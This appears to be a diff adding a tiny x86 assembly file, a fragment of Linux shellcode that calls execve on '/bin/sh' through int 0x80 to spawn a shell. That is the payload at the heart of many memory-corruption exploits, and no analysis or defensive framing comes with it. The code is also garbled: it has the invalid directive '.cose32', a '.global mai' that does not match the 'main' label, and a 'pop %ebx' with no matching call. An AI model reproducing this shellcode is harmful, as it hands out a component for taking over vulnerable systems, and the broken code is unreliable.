@@ -1,0 +1,11 @@
+.string "/bin/sh"
+.cose32
+.text
+.global mai
+
+main: pop %ebx
+xor %eax, %eax
+movb $0xb, %al
+xor %ecx, %ecx
+xor %edx, %edx
+int $0x80
